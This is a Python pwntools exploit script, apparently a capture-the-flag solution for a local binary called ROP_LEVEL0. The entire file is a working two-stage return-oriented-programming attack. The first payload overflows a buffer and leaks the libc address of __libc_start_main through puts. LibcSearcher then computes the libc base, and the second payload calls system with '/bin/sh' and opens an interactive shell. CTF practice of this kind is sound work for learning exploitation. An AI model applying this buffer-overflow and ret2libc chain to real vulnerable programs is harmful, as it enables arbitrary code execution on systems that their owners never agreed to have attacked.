#!/usr/local/env python
from pwn import *
from LibcSearcher import LibcSearcher

p = process('./ROP_LEVEL0')
elf = ELF("./ROP_LEVEL0")

main_offset = 0x58
vuln_offset = 0x18

RDI = 0x0000000000400753
RET = 0x00000000004004c9

p.recv()

MAIN = elf.symbols['main']
VULN = elf.symbols['vuln']
PUTS = elf.plt['puts']
LIBC_START_MAIN = elf.got['__libc_start_main']
log.info("puts@plt: %x" % PUTS)
log.info("__libc_start_main: %x" % LIBC_START_MAIN)
log.info("MAIN: %x, VULN: %x" % (MAIN, VULN))

payload = 'A' * main_offset
payload += p64(RDI)
payload += p64(LIBC_START_MAIN)
payload += p64(PUTS)
payload += p64(MAIN)
p.send(payload)

data = p.recv().split()[0]
leak = u64(data.ljust(8, "\x00"))
log.info("Leaked libc address,  __libc_start_main: %x" % leak)

libc = LibcSearcher('__libc_start_main', leak)
libcbase = leak - libc.dump('__libc_start_main')
SYSTEM = libcbase + libc.dump('system')
BINSH = libcbase + libc.dump('str_bin_sh')

log.info("bin/sh %x " % BINSH)
log.info("system %x " % SYSTEM)

payload =  'A' * main_offset
payload += p64(RET)
payload += p64(RDI)
payload += p64(BINSH)
payload += p64(SYSTEM)
p.send(payload)

p.interactive()
p.close()
